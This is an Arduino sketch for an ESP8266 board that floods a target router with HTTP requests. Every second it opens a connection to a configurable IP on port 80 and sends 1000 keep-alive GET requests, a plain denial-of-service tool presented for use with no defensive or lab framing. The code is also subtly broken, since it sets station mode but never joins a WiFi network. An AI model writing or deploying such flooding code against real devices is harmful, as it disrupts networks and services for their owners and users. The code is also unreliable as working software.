#include <ESP8266WiFi.h>

// Set the target router's IP address
const char* targetIP = "192.168.1.1"; // Replace with the target router's IP address

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
}

void loop() {
  // Create a socket
  WiFiClient client;

  // Connect to the target router
  if (client.connect(targetIP, 80)) {
    Serial.println("Connected to target router");

    // Send a large number of HTTP requests to flood the router
    for (int i = 0; i < 1000; i++) {
      client.println("GET / HTTP/1.1");
      client.println("Host: " + String(targetIP));
      client.println("Connection: keep-alive");
      client.println();
    }

    Serial.println("Sent HTTP requests");
  } else {
    Serial.println("Failed to connect to target router");
  }

  delay(1000);
}